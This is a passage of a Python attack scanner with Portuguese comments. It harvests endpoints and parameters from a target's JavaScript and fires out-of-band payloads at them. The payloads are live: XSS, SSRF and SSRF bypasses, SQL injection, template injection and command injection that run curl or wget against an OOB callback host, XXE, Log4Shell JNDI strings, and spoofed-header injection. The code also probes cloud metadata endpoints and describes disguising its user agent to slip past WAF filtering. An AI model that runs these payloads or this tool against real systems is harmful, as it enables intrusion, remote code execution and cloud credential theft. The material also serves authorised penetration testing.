        interior = interior[1:-1]

    # Colapsa sub-objetos aninhados {…} para {} (nivel raiz não afetado)
    flat = interior
    for _ in range(8):
        collapsed = re.sub(r'\{[^{}]*\}', '{}', flat)
        if collapsed == flat:
            break
        flat = collapsed

    params = []
    for k in _QUOTED_KEY.findall(flat):
        if k not in _BODY_SKIP and len(k) > 1:
            params.append(k)
    for k in _UNQUOTED_KEY.findall(flat):
        if k not in _BODY_SKIP and not k[0].isupper() and len(k) > 1:
            params.append(k)
    return list(dict.fromkeys(params))


def extract_body_params(content: str, pos: int) -> list[str]:
    window = content[max(0, pos - 100): pos + 900]

    for sm in _STRINGIFY_RE.finditer(window):
        start = sm.end()
        if start >= len(window):
            continue

        ch = window[start]

        # ── Caso 1 & 2: objeto literal ────────────────────────────────────
        if ch == '{':
            obj = _balance_braces(window, start)
            if obj:
                return _keys_from_object(obj)

        # ── Caso 3: variável — rastreia definição ─────────────────────────
        elif re.match(r'[A-Za-z_$]', ch):
            vm = re.match(r'([A-Za-z_$][A-Za-z0-9_$]*)', window[start:])
            if not vm:
                continue
            var_name = vm.group(1)

            # Busca numa janela maior atrás do endpoint
            big = content[max(0, pos - 3000): pos + 50]
            var_def = re.compile(
                rf'(?:const|let|var)?\s*{re.escape(var_name)}\s*=\s*\{{',
                re.I,
            )
            for vd in var_def.finditer(big):
                obj_start = big.index('{', vd.start())
                obj = _balance_braces(big, obj_start)
                if obj:
                    keys = _keys_from_object(obj)
                    if keys:
                        return keys

        break  # só o primeiro JSON.stringify após o endpoint

    return []

# ─── Extração de headers mencionados no JS ────────────────────────────────────
# Extrai apenas headers que o código JS menciona explicitamente.
# Esses são os únicos headers injetados na Fase 3.
_HEADER_RE = re.compile(
    r'["\']([A-Za-z][A-Za-z0-9\-]{2,40})["\']'
    r'\s*:\s*'
    r'["\']([^"\']{1,200})["\']',
)
_KNOWN_HTTP_HEADERS = {
    "content-type", "authorization", "accept", "x-api-key",
    "x-auth-token", "x-access-token", "token", "api-key",
    "x-requested-with", "x-csrf-token", "x-request-id",
    "x-correlation-id", "x-forwarded-for", "x-real-ip",
    "origin", "referer", "cookie", "user-agent",
    "accept-language", "accept-encoding", "cache-control",
    "content-length", "x-custom-header",
}

def extract_js_headers(content: str) -> dict[str, str]:
    """
    Extrai headers que o JS menciona explicitamente em fetch/XHR.
    Retorna {header_name: valor_original}.
    """
    found: dict[str, str] = {}
    # Busca blocos headers: { ... } próximos a fetch/axios
    header_blocks = re.findall(
        r'headers\s*:\s*\{([^}]{1,800})\}',
        content, re.I | re.DOTALL
    )
    for block in header_blocks:
        for m in _HEADER_RE.finditer(block):
            name = m.group(1)
            val  = m.group(2)
            if name.lower() in _KNOWN_HTTP_HEADERS or name.startswith(("X-", "x-")):
                found[name] = val
    return found

_PATH_PARAM_RE = re.compile(r'[:{<]([a-zA-Z][a-zA-Z0-9_]{1,30})[}>]?')

def extract_path_params(url: str) -> list[str]:
    path = urlparse(url).path
    return _PATH_PARAM_RE.findall(path)

def inject_path_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    new_path = re.sub(
        rf'(?::{re.escape(param)}|\{{{re.escape(param)}\}}|<{re.escape(param)}>)',
        urllib.parse.quote(value, safe=''),
        parsed.path,
    )
    return urllib.parse.urlunparse(parsed._replace(path=new_path))

# ─── Análise de JS ────────────────────────────────────────────────────────────
_seen_endpoints: set[tuple] = set()
_ep_lock        = threading.Lock()
_analyzed_js:   set[str]        = set()
_analyzed_lock: threading.Lock  = threading.Lock()

def analyze_js_content(content: str, js_url: str,
                       target_domain: str, confirmed_hosts: set[str],
                       lg: logging.Logger) -> list[dict]:
    if HAS_BEAUTIFY:
        try:
            content = jsbeautifier.beautify(content)
        except Exception:
            pass

    # Extrai headers mencionados neste arquivo JS
    js_headers = extract_js_headers(content)

    found = []
    for label, pattern, method_hint in ENDPOINT_PATTERNS:
        for m in pattern.finditer(content):
            if label == "xhr_open":
                method = m.group(1).upper()
                path   = m.group(2).strip().strip("\"'`")
            elif method_hint == "DYNAMIC" and m.lastindex and m.lastindex >= 2:
                path   = m.group(1).strip().strip("\"'`")
                method = m.group(2).upper()
            else:
                path   = m.group(1).strip().strip("\"'`")
                method = method_hint

            if not path:
                continue

            if label in ("fetch_baseurl", "fetch_baseurl_m") and _TMPL_LITERAL.search(path):
                path = _TMPL_LITERAL.split(path)[0].rstrip("/") or path
                if not path or len(path) < 3:
                    continue

            valid, reason = is_valid_endpoint(path, target_domain, confirmed_hosts)
            if not valid:
                lg.debug("  [DROP][%s] %s → %s", reason, path[:80], js_url)
                continue

            abs_url = resolve_endpoint_url(path, js_url, target_domain)

            key = (method if method != "ANY" else "*",
                   abs_url.split("?")[0].rstrip("/") or "/")
            with _ep_lock:
                if key in _seen_endpoints:
                    continue
                _seen_endpoints.add(key)

            # Query params extraídos LITERALMENTE do path
            query_params = ""
            if "?" in path:
                raw_qs = path.split("?", 1)[1].split("#")[0]
                # Remove template literals dos valores mas mantém os nomes
                clean_qs = _TMPL_LITERAL.sub("__OOB__", raw_qs)
                query_params = clean_qs

            # Body params extraídos do contexto JS adjacente
            body_params: list[str] = []
            if method in ("POST", "PUT", "PATCH", "DYNAMIC", "ANY"):
                body_params = extract_body_params(content, m.start())

            ep = {
                "method":       method,
                "path":         path,
                "absolute_url": abs_url,
                "query_params": query_params,
                "body_params":  body_params,
                "js_headers":   js_headers,   # headers mencionados no JS
                "js_source":    js_url,
                "origin_host":  urlparse(js_url).netloc or target_domain,
                "label":        label,
            }
            found.append(ep)
            lg.debug("  [EP][%s] %s ← %s", method, path[:80], js_url)

    return found

def _is_real_js(resp: requests.Response, content: str) -> bool:
    ct = resp.headers.get("Content-Type", "")
    if "javascript" in ct or "ecmascript" in ct:
        return True
    s = content.strip()
    if s.startswith(("<html", "<!DOCTYPE", "<?xml")):
        return False
    return True

def process_one_js(url: str, target_domain: str, confirmed_hosts: set[str],
                   cache_dir: Path, cfg: dict,
                   lg: logging.Logger, get_fn) -> list[dict]:
    key = url.split("?")[0]
    with _analyzed_lock:
        if key in _analyzed_js:
            return []
        _analyzed_js.add(key)

    cf = cache_dir / (hashlib.sha1(key.encode()).hexdigest()[:16] + ".json")
    if cf.exists() and not cfg.get("no_cache"):
        try:
            d = json.loads(cf.read_text(encoding="utf-8"))
            if d.get("v") == "4" and time.time() - d.get("ts", 0) < 86400:
                return analyze_js_content(d["c"], url, target_domain,
                                          confirmed_hosts, lg)
        except Exception:
            pass

    try:
        resp = get_fn(url)
    except Exception as e:
        lg.debug("Falha %s: %s", url, e)
        return []

    if resp.status_code != 200:
        return []
    content = resp.text
    if not _is_real_js(resp, content):
        return []

    if not cfg.get("no_cache"):
        try:
            cf.parent.mkdir(parents=True, exist_ok=True)
            cf.write_text(
                json.dumps({"v": "4", "ts": time.time(), "c": content},
                           ensure_ascii=False),
                encoding="utf-8",
            )
        except Exception:
            pass

    return analyze_js_content(content, url, target_domain, confirmed_hosts, lg)

def _make_get_fn(cfg: dict):
    _req_lg = logging.getLogger("jsrecon_oob.req")
    proxy = cfg.get("proxy", "")

    @retry(stop=stop_after_attempt(3),
           wait=wait_exponential(multiplier=1, min=2, max=30),
           retry=retry_if_exception_type((
               requests.exceptions.ConnectionError,
               requests.exceptions.Timeout,
           )),
           before_sleep=before_sleep_log(_req_lg, logging.DEBUG),
           reraise=True)
    def _get(url: str, **kw) -> requests.Response:
        kw.setdefault("proxies", {"http": proxy, "https": proxy} if proxy else None)
        return requests.get(
            url,
            headers={"User-Agent": REAL_UA},
            timeout=cfg.get("timeout", 10),
            verify=False, allow_redirects=True, **kw,
        )
    return _get

def analyze_all_js(js_urls: list[str], target_domain: str,
                   confirmed_hosts: set[str], out: Path,
                   cfg: dict, lg: logging.Logger) -> list[dict]:
    clog(lg, f"\n━━━ Análise de JS ({len(js_urls)} arquivos) ━━━",
         C.BLUE + C.BOLD)
    cache_dir = out / ".js_cache"
    get_fn    = _make_get_fn(cfg)
    all_eps: list[dict] = []
    workers = cfg.get("workers", 20)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(process_one_js, u, target_domain, confirmed_hosts,
                          cache_dir, cfg, lg, get_fn): u
                for u in js_urls}
        done = 0
        for fut in as_completed(futs):
            done += 1
            if done % 20 == 0:
                clog(lg, f"  Progresso: {done}/{len(js_urls)} JS", C.DIM)
            try:
                eps = fut.result()
                all_eps.extend(eps)
            except Exception as e:
                lg.error("Worker JS error: %s", e)

    clog(lg, f"  Endpoints extraídos (pós-filtro): {len(all_eps)}",
         C.GREEN + C.BOLD)
    return all_eps

# ─── Salva endpoints agrupados por método ─────────────────────────────────────
def save_endpoints_by_method(endpoints: list[dict], out: Path,
                             lg: logging.Logger) -> dict[str, Path]:
    clog(lg, "\n━━━ Salvando endpoints por método ━━━", C.BLUE + C.BOLD)

    method_map: dict[str, list[dict]] = collections.defaultdict(list)
    for ep in endpoints:
        m = ep["method"].upper()
        if m in ("ANY", "DYNAMIC", "XHR", "WS"):
            label = ep.get("label", "").lower()
            if "post" in label or "graphql" in label or "webhook" in label:
                m = "POST"
            elif "websocket" in label:
                m = "WS"
            else:
                m = "GET"
        method_map[m].append(ep)

    files: dict[str, Path] = {}
    for method, eps in sorted(method_map.items()):
        fname = out / f"endpoints_{method.lower()}.txt"
        lines = []
        for ep in eps:
            line = ep["absolute_url"]
            if ep.get("query_params") and "?" not in line:
                line += "?" + ep["query_params"]
            if ep.get("body_params"):
                line += f"  # body: {', '.join(ep['body_params'])}"
            if ep.get("js_headers"):
                line += f"  # headers: {', '.join(ep['js_headers'].keys())}"
            lines.append(line)
        _write(fname, lines, lg)
        files[method] = fname
        clog(lg, f"  [{method:6}] {len(eps):4d} endpoints → {fname.name}", C.GREEN)

    jsonl = out / "endpoints.jsonl"
    with open(jsonl, "w", encoding="utf-8") as f:
        for ep in endpoints:
            f.write(json.dumps(ep, ensure_ascii=False) + "\n")

    return files

# ─── Fase 3: Payloads OOB ─────────────────────────────────────────────────────
#
# REGRA CENTRAL: cada payload curl/wget usa -A com REAL_UA.
# Isso garante que requests OOB não sejam bloqueadas por WAF/CDN
# que filtram User-Agents de ferramentas (curl/1.x, python-requests, etc).
#
OOB_PAYLOADS: dict[str, list[str]] = {
    "xss": [
        '"><img src="https://{ID}.{OOB}/" onerror=x>',
        "'><script src=https://{ID}.{OOB}/></script>",
        '"><svg/onload=fetch(`https://{ID}.{OOB}/`)>',
        '"><details open ontoggle=fetch(`https://{ID}.{OOB}/`)>',
        '"><iframe src="https://{ID}.{OOB}/">',
    ],
    "ssrf": [
        "https://{ID}.{OOB}/",
        "http://{ID}.{OOB}/",
        "dict://{ID}.{OOB}:80/",
        "ftp://{ID}.{OOB}/",
        "ldap://{ID}.{OOB}/",
        "sftp://{ID}.{OOB}/",
    ],
    "ssrf_bypass": [
        "http://0/{ID}",
        "http://0x7f000001/{ID}",
        "http://2130706433/{ID}",
        "http://127.1/{ID}",
        "http://[::1]/{ID}",
        "http://{ID}.{OOB}@127.0.0.1/",
        "http://127.0.0.1#{ID}.{OOB}",
        "http://{ID}.{OOB}%2F",
        "//[{ID}.{OOB}]/",
        "http://{ID}.{OOB}\t/",
        "http://127.0.0.1.{ID}.{OOB}/",
    ],
    "sqli": [
        "' AND 1=1 AND LOAD_FILE(CONCAT('\\\\\\\\','{ID}','.{OOB}','\\\\a'))-- -",
        "' AND 1=1 AND LOAD_FILE(0x{HEX_OOB})-- -",
        "'; EXEC master..xp_dirtree '\\\\{ID}.{OOB}\\share';-- -",
        "'; SELECT dblink_connect('host={ID}.{OOB} dbname=a user=a');-- -",
        "' AND 1=(SELECT UTL_HTTP.REQUEST('https://{ID}.{OOB}/') FROM dual)-- -",
    ],
    "ssti": [
        # UA incluído nos payloads curl dentro de SSTI
        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','-A','" + REAL_UA + "','https://{ID}.{OOB}/'],stdout=-1).communicate()}}",
        "${__import__('os').popen('curl -A \"" + REAL_UA + "\" https://{ID}.{OOB}/').read()}",
        "<%= `curl -A '" + REAL_UA + "' https://{ID}.{OOB}/` %>",
        '${"curl -A \\"' + REAL_UA + '\\" https://{ID}.{OOB}/".execute().text}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl -A \\"' + REAL_UA + '\\" https://{ID}.{OOB}/")}',
        "{{['curl','-A','" + REAL_UA + "','https://{ID}.{OOB}/']|filter('system')}}",
    ],
    "rce": [
        f'; curl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/ #',
        f'$(curl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/)',
        f'`curl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/`',
        f'| curl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/',
        f'\ncurl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/\n',
        f'; wget --user-agent="{REAL_UA}" https://{{ID}}.{{OOB}}/ #',
        f'; nslookup {{ID}}.{{OOB}} #',
        f'; Invoke-WebRequest -UserAgent "{REAL_UA}" https://{{ID}}.{{OOB}}/ #',
    ],
    "redirect": [
        "https://{ID}.{OOB}/",
        "//https://{ID}.{OOB}/",
        "//{ID}.{OOB}/",
        "@{ID}.{OOB}/",
        "https://{ID}.{OOB}%2F",
        "https:/%5C%5C{ID}.{OOB}/",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "https://{ID}.{OOB}/">]><r>&x;</r>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % oob SYSTEM "https://{ID}.{OOB}/">%oob;]>',
        '<?xml version="1.0"?><!DOCTYPE r SYSTEM "https://{ID}.{OOB}/">',
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink"><image xl:href="https://{ID}.{OOB}/"/></svg>',
    ],
    "log4shell": [
        "${{jndi:ldap://{ID}.{OOB}/{ID}}}",
        "${{j${{::-n}}di:ldap://{ID}.{OOB}/{ID}}}",
        "${{jndi:dns://{ID}.{OOB}/{ID}}}",
        "${{jndi:rmi://{ID}.{OOB}/{ID}}}",
        "${{jndi:ldaps://{ID}.{OOB}/{ID}}}",
        "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{ID}.{OOB}/{ID}}}",
        "${{${{lower:j}}ndi:ldap://{ID}.{OOB}/{ID}}}",
    ],
    "graphql": [
        '{{"query":"{{ importUrl(url:\\"https://{ID}.{OOB}/\\") }}"}}',
        '{{"query":"{{ fetchUrl(url:\\"https://{ID}.{OOB}/\\") }}"}}',
        '{{"query":"mutation {{ uploadFromUrl(url:\\"https://{ID}.{OOB}/\\") {{ id }} }}"}}',
    ],
    "smtp": [
        "user@{ID}.{OOB}",
        "admin@{ID}.{OOB}",
        "<user@{ID}.{OOB}>",
        '"OOB Test" <oob@{ID}.{OOB}>',
    ],
    "upload_ssrf": [
        '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://{ID}.{OOB}/"/></svg>',
        '=IMPORTDATA("https://{ID}.{OOB}/")',
        '<meta http-equiv="refresh" content="0;url=https://{ID}.{OOB}/">',
        '<?xml version="1.0"?><!DOCTYPE x SYSTEM "https://{ID}.{OOB}/">',
    ],
    "websocket": [
        '{{"type":"connect","url":"https://{ID}.{OOB}/"}}',
        '{{"action":"subscribe","endpoint":"https://{ID}.{OOB}/"}}',
        '{{"cmd":"fetch","target":"https://{ID}.{OOB}/"}}',
    ],
    "log_injection": [
        "\r\nX-Injected: https://{ID}.{OOB}/\r\n",
        '{{"version":"1.1","host":"{ID}.{OOB}","short_message":"oob"}}',
    ],
}

# ─── Cloud metadata ───────────────────────────────────────────────────────────
CLOUD_METADATA_CHECKS: list[tuple[str, str, list[str]]] = [
    ("AWS",          "http://169.254.169.254/latest/meta-data/",           ["ami-id", "instance-id", "instance-type"]),
    ("GCP",          "http://metadata.google.internal/computeMetadata/v1/",["computeMetadata", "project-id"]),
    ("Azure",        "http://169.254.169.254/metadata/instance",            ["compute", "azEnvironment", "subscriptionId"]),
    ("Alibaba",      "http://100.100.100.200/latest/meta-data/",            ["instance-id", "region-id"]),
    ("DigitalOcean", "http://169.254.169.254/metadata/v1/",                 ["droplet_id", "hostname"]),
]

def check_cloud_metadata(base_url: str, param: str,
                         lg: logging.Logger, proxy: str = "") -> Optional[tuple[str, str]]:
    for provider, meta_url, signatures in CLOUD_METADATA_CHECKS:
        try:
            injected = _inject_param(base_url, param, meta_url)
            proxies  = {"http": proxy, "https": proxy} if proxy else None
            resp = requests.get(
                injected, timeout=8, verify=False, allow_redirects=True,
                proxies=proxies,
                headers={"User-Agent": REAL_UA},
            )
            if any(sig in resp.text for sig in signatures):
                lg.warning("  🔥 CLOUD METADATA EXPOSED! Provider: %s via %s param: %s",
                           provider, base_url, param)
                return (provider, meta_url)
        except Exception:
            pass
    return None

# ─── Headers OOB — extraídos do JS + conjunto fixo SSRF/Log4Shell ─────────────
#
# REGRA: injetamos headers em duas camadas:
#   1. Headers que o JS menciona explicitamente (extraídos por extract_js_headers)
#      → valor substituído pelo payload OOB
#   2. Conjunto fixo de headers SSRF/Log4Shell universais
#      → sempre injetados pois são vetores independentes de framework
#
# Não inventamos parâmetros de query/body, mas headers HTTP de infra
# (X-Forwarded-For, User-Agent para Log4Shell, etc.) são testados
# universalmente porque o servidor os processa independente do código JS.

OOB_HEADERS_SSRF: list[tuple[str, str]] = [
    ("X-Forwarded-For",           "{ID}.{OOB}"),
    ("X-Real-IP",                 "{ID}.{OOB}"),
    ("X-Forwarded-Host",          "{ID}.{OOB}"),
    ("X-Forwarded-Server",        "{ID}.{OOB}"),
    ("X-HTTP-Host-Override",      "{ID}.{OOB}"),
    ("X-Forwarded-Proto",         "https://{ID}.{OOB}/"),
    ("X-ProxyUser-Ip",            "{ID}.{OOB}"),
    ("X-Remote-IP",               "{ID}.{OOB}"),
    ("X-Remote-Addr",             "{ID}.{OOB}"),
    ("X-Original-URL",            "https://{ID}.{OOB}/"),
    ("X-Rewrite-URL",             "https://{ID}.{OOB}/"),
    ("X-Custom-IP-Authorization", "{ID}.{OOB}"),
    ("X-Originating-IP",          "{ID}.{OOB}"),
    ("True-Client-IP",            "{ID}.{OOB}"),
    ("CF-Connecting-IP",          "{ID}.{OOB}"),
    ("X-Host",                    "{ID}.{OOB}"),
    ("Forwarded",                 "for={ID}.{OOB};by={ID}.{OOB}"),
    ("Via",                       "1.1 {ID}.{OOB}"),
    ("X-Callback-URL",            "https://{ID}.{OOB}/"),
    ("X-Hook-URL",                "https://{ID}.{OOB}/"),
    ("X-Webhook-URL",             "https://{ID}.{OOB}/"),
    ("X-Wap-Profile",             "https://{ID}.{OOB}/"),
    ("Referer",                   "https://{ID}.{OOB}/"),
    ("Origin",                    "https://{ID}.{OOB}"),
    ("Contact",                   "admin@{ID}.{OOB}"),
    ("From",                      "user@{ID}.{OOB}"),
]

OOB_HEADERS_LOG4J: list[tuple[str, str]] = [
    ("User-Agent",      "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
    ("X-Api-Version",   "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
    ("X-Forwarded-For", "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
    ("Accept-Language", "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
    ("Accept",          "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
    ("DNT",             "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
    ("X-Arbitrary",     "${{jndi:ldap://{ID}.{OOB}/{ID}}}"),
]

_PATH_PARAM_SSRF_RE = re.compile(
    r'/(?:fetch|proxy|render|load|get|download|import|export|'
    r'preview|screenshot|pdf|convert|transform|mirror|relay|'
    r'forward|pass|bridge|gate|check|ping|test|validate|resolve)'
    r'(?:/|\b)',
    re.I
)

# ─── Build payload ────────────────────────────────────────────────────────────
def _build_payload(tpl: str, oob_host: str, uid: str) -> str:
    subdomain = f"{uid}.{oob_host}"
    hex_oob   = subdomain.encode().hex()
    return (tpl
            .replace("{OOB}",     oob_host)
            .replace("{ID}",      uid)
            .replace("{HEX_OOB}", hex_oob))

# ─── Seleção de payloads por TIPO de endpoint — sem heurística de nome ────────
#
# MUDANÇA CENTRAL: payloads são escolhidos pelo TIPO DO ENDPOINT,
# não pelo nome do parâmetro. O nome do param só é usado para
# determinar se é campo de e-mail (SMTP) ou se é um path param REST.
# Nenhum parâmetro é inventado — só injeta nos que existem no JS.
#
def _choose_payloads_for_param(
    method: str,
    param_name: str,
    is_query_param: bool,
    is_body_param: bool,
    is_path_param: bool,
    endpoint_label: str,
    base_url: str,
) -> list[tuple[str, str]]:
    """
    Escolhe payloads com base no TIPO do endpoint e do parâmetro.
    Não faz inferência por nome — só pelo contexto estrutural.
    """
    chosen: list[tuple[str, str]] = []
    pm = param_name.lower()

    # ── Parâmetro de e-mail → SMTP OOB ────────────────────────────────────
    # Única heurística de nome mantida: campos email/mail são SMTP por natureza
    if any(k in pm for k in ("email", "mail")):
        chosen += [("smtp", p) for p in OOB_PAYLOADS["smtp"]]
        return _dedup(chosen)

    # ── Path param REST (:id, {resource}) → SSRF no path ──────────────────
    if is_path_param:
        chosen += [("ssrf",        p) for p in OOB_PAYLOADS["ssrf"]]
        chosen += [("ssrf_bypass", p) for p in OOB_PAYLOADS["ssrf_bypass"][:4]]
        return _dedup(chosen)

    # ── Endpoint de proxy/fetch/render → SSRF forte ────────────────────────
    if _PATH_PARAM_SSRF_RE.search(base_url):
        chosen += [("ssrf",        p) for p in OOB_PAYLOADS["ssrf"]]
        chosen += [("ssrf_bypass", p) for p in OOB_PAYLOADS["ssrf_bypass"]]
        chosen += [("upload_ssrf", p) for p in OOB_PAYLOADS["upload_ssrf"]]
        chosen += [("xxe",         p) for p in OOB_PAYLOADS["xxe"]]
        return _dedup(chosen)

    # ── GraphQL → payload estruturado ──────────────────────────────────────
    if endpoint_label in ("graphql", "graphql_url") or "graphql" in base_url.lower():
        chosen += [("graphql", p) for p in OOB_PAYLOADS["graphql"]]
        return _dedup(chosen)

    # ── POST/PUT/PATCH body param → SSRF + XXE ─────────────────────────────
    if is_body_param and method in ("POST", "PUT", "PATCH"):
        chosen += [("ssrf",        p) for p in OOB_PAYLOADS["ssrf"]]
        chosen += [("ssrf_bypass", p) for p in OOB_PAYLOADS["ssrf_bypass"][:3]]
        chosen += [("xxe",         p) for p in OOB_PAYLOADS["xxe"]]
        chosen += [("log4shell",   p) for p in OOB_PAYLOADS["log4shell"][:3]]
        return _dedup(chosen)

    # ── Query param GET → SSRF + XSS ──────────────────────────────────────
    if is_query_param and method == "GET":
        chosen += [("ssrf",   p) for p in OOB_PAYLOADS["ssrf"]]
        chosen += [("xss",    p) for p in OOB_PAYLOADS["xss"]]
        chosen += [("redirect", p) for p in OOB_PAYLOADS["redirect"]]
        return _dedup(chosen)

    # ── Fallback conservador — SSRF básico ────────────────────────────────
    chosen += [("ssrf", p) for p in OOB_PAYLOADS["ssrf"][:2]]
    return _dedup(chosen)


def _dedup(lst: list[tuple[str, str]]) -> list[tuple[str, str]]:
    seen: set[str] = set()
    out  = []
    for cat, tpl in lst:
        if tpl not in seen:
            seen.add(tpl)
            out.append((cat, tpl))
    return out

# ─── Injeção HTTP ──────────────────────────────────────────────────────────────
def _inject_param(url: str, param: str, value: str) -> str:
    try:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        new_qs = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_qs))
    except Exception:
        return url

def _send_request(url: str, method: str, headers: dict,
                  body=None, timeout: int = 8,
                  proxy: str = "") -> str:
    try:
        fn      = getattr(requests, method.lower(), requests.get)
        proxies = {"http": proxy, "https": proxy} if proxy else None
        # Garante que REAL_UA está presente em todas as requests
        headers.setdefault("User-Agent", REAL_UA)
        kwargs: dict = {
            "headers":         headers,
            "timeout":         timeout,
            "verify":          False,
            "allow_redirects": False,
            "proxies":         proxies,
        }
        if body is not None and method in ("POST", "PUT", "PATCH"):
            if isinstance(body, str):
                kwargs["data"]    = body
                headers.setdefault("Content-Type", "application/json")
            else:
                kwargs["json"] = body
        r = fn(url, **kwargs)
        return str(r.status_code)
    except requests.exceptions.Timeout:
        return "TMO"
    except requests.exceptions.ConnectionError:
        return "ERR"
    except Exception:
        return "???"

def inject_endpoint(ep: dict, oob_host: str, plog: PayloadLog,
                    lg: logging.Logger, proxy: str = "") -> int:
    method   = ep["method"].upper()
    base_url = ep["absolute_url"]
    label    = ep.get("label", "")
    sent     = 0

    # ── Inferência de método HTTP ──────────────────────────────────────────
    if method in ("GET", "POST", "PUT", "PATCH", "DELETE", "WS"):
        req_method = method
    else:
        has_body = bool(ep.get("body_params"))
        if label in _GET_LABELS and not has_body:
            req_method = "GET"
        elif label in _POST_LABELS or has_body:
            req_method = "POST"
        else:
            req_method = "GET"

    if req_method == "WS":
        sent += _inject_websocket(ep, oob_host, plog, lg)
        return sent

    method_display = req_method

    # ── Coleta params EXCLUSIVAMENTE do JS ───────────────────────────────
    # REGRA: zero parâmetros inventados.
    # Só injeta em params que existem em uma destas fontes:
    #   a) query string literal extraída do JS
    #   b) body params extraídos do contexto JSON.stringify no JS
    #   c) path params REST (:id, {id}) extraídos do path
    #
    params_from_qs   = []
    params_from_body = ep.get("body_params", [])
    params_from_path = extract_path_params(base_url)

    if "?" in base_url:
        qs = urllib.parse.urlparse(base_url).query
        params_from_qs = list(urllib.parse.parse_qs(
            qs.replace("__OOB__", "placeholder"),
            keep_blank_values=True
        ).keys())

    # Se não há nenhum param em nenhuma fonte → não injeta nada neste endpoint
    # (apenas headers OOB ainda são testados, pois são camada de infra)
    has_any_param = bool(params_from_qs or params_from_body or params_from_path)

    if has_any_param:
        # Dedup mantendo ordem de prioridade: qs > body > path
        all_params = list(dict.fromkeys(
            params_from_qs + params_from_body + params_from_path
        ))

        for param in all_params:
            is_qs   = param in params_from_qs
            is_body = param in params_from_body
            is_path = param in params_from_path

            payloads = _choose_payloads_for_param(
                req_method, param, is_qs, is_body, is_path, label, base_url
            )

            for category, tpl in payloads:
                uid     = unique_id(category, param)
                payload = _build_payload(tpl, oob_host, uid)
                sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")

                if category == "graphql":
                    injected_url = base_url
                    body_data    = payload
                elif is_path:
                    injected_url = inject_path_param(base_url, param, payload)
                    body_data    = None
                elif req_method == "GET" or is_qs:
                    injected_url = _inject_param(base_url, param, payload)
                    body_data    = None
                else:
                    injected_url = base_url
                    body_data    = {
                        p: (payload if p == param else f"<{p}>")
                        for p in (params_from_body or [param])
                    }

                headers = {
                    "User-Agent": REAL_UA,
                    "Accept":     "application/json, */*",
                }

                # Inclui headers do JS se existirem (ex: Content-Type: application/json)
                if ep.get("js_headers"):
                    for hk, hv in ep["js_headers"].items():
                        if hk.lower() not in ("user-agent",):
                            headers.setdefault(hk, hv)

                plog.record(uid, base_url, param, category, payload)
                _rate_limiter.acquire()
                code = _send_request(injected_url, req_method, headers, body_data,
                                     proxy=proxy)

                clog(lg,
                     f"  {sent_at} [{uid[:28]}] "
                     f"{param:15} {category:12} "
                     f"[{method_display}] HTTP {code} → {base_url[:45]}",
                     C.GREEN if code in ("200","201","301","302") else C.DIM)
                sent += 1

        # Cloud metadata — só em params de URL/body que o JS expôs
        ssrf_params = [p for p in (params_from_qs + params_from_body)
                       if any(k in p.lower() for k in
                              ("url", "uri", "src", "dest", "redirect",
                               "target", "host", "callback", "fetch",
                               "proxy", "domain", "subdomain"))]
        for param in ssrf_params[:2]:
            check_cloud_metadata(base_url, param, lg, proxy)
    else:
        clog(lg,
             f"  [SKIP params] {base_url[:60]} — nenhum param extraído do JS",
             C.DIM)

    # ── Headers OOB SSRF — camada de infraestrutura ────────────────────────
    # Headers são injetados mesmo sem params de query/body porque
    # o servidor HTTP os processa independente do código da aplicação.
    for hdr_name, hdr_tpl in OOB_HEADERS_SSRF:
        uid      = unique_id("hdr", re.sub(r'[^a-z0-9]', '', hdr_name.lower())[:6])
        payload  = _build_payload(hdr_tpl, oob_host, uid)
        sent_at  = datetime.now(timezone.utc).strftime("%H:%M:%S")

        headers = {
            "User-Agent": REAL_UA,
            "Accept":     "application/json, */*",
            hdr_name:     payload,
        }

        hdr_body = ({"_": ""} if req_method in ("POST", "PUT", "PATCH")
                    and params_from_body else None)

        plog.record(uid, base_url, hdr_name, "header_ssrf", payload)
        _rate_limiter.acquire()
        code = _send_request(base_url, req_method, headers, hdr_body, proxy=proxy)

        clog(lg,
             f"  {sent_at} [{uid[:28]}] "
             f"{hdr_name:25} header_ssrf  "
             f"[{method_display}] HTTP {code} → {base_url[:30]}",
             C.DIM)
        sent += 1

    # ── Headers Log4Shell — requisição separada ────────────────────────────
    log4j_headers: dict[str, str] = {
        "User-Agent": REAL_UA,
        "Accept":     "application/json, */*",
    }
    for hdr_name, hdr_tpl in OOB_HEADERS_LOG4J:
        uid     = unique_id("l4j", re.sub(r'[^a-z0-9]', '', hdr_name.lower())[:6])
        payload = _build_payload(hdr_tpl, oob_host, uid)
        log4j_headers[hdr_name] = payload
        plog.record(uid, base_url, hdr_name, "log4shell_header", payload)

    _rate_limiter.acquire()
    code = _send_request(base_url, req_method, log4j_headers,
                         ({"_": ""} if req_method in ("POST","PUT","PATCH") else None),
                         proxy=proxy)
    clog(lg,
         f"  [log4shell-headers] [{method_display}] HTTP {code} → {base_url[:45]}",
         C.DIM)
    sent += len(OOB_HEADERS_LOG4J)

    return sent

def _inject_websocket(ep: dict, oob_host: str,
                      plog: PayloadLog, lg: logging.Logger) -> int:
    sent   = 0
    ws_url = ep["absolute_url"]
    try:
        import websocket as ws_lib
